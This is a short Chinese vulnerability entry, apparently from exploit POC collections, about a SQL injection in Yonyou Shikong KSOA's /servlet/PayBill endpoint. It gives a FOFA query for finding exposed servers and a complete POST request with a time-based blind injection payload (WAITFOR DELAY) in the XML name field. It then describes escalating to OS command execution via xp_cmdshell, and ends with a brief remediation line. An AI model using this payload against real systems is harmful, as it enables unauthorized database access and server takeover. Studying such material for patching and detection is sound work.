---
fofa: "app=\"用友-时空KSOA\""
source: "OA-EXPTOOL/Lucifer1993 + afrog-pocs/zan8in"
---

# 用友 时空KSOA PayBill SQL注入漏洞

# 漏洞描述

用友时空 KSOA /servlet/PayBill 接口存在 SQL 注入漏洞。攻击者可通过 XML 请求体中的 name 参数进行时间盲注执行任意 SQL 语句，并可进一步利用 MSSQL 的 xp_cmdshell 执行系统命令。

# 影响版本

用友时空 KSOA

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 未公开 | 未知 |

# 漏洞复现

FOFA：app="用友-时空KSOA"

POC/EXP：

```
POST /servlet/PayBill?caculate&_rnd= HTTP/1.1
Host: {{Hostname}}
Content-Type: application/xml
Accept-Encoding: gzip, deflate
Connection: close

<?xml version="1.0" encoding="UTF-8"?><root><name>1</name><name>1</name><name>1</name><name>1';WAITFOR DELAY '0:0:5'--</name></root>
```

若响应延迟约 5 秒，则存在时间盲注；确认注入后可通过堆叠注入调用 `exec master..xp_cmdshell 'whoami'` 等语句执行系统命令。

# 漏洞修复

联系用友官方获取安全补丁，对 XML 请求体参数使用预编译语句并做严格过滤，禁用数据库账号的高危权限。
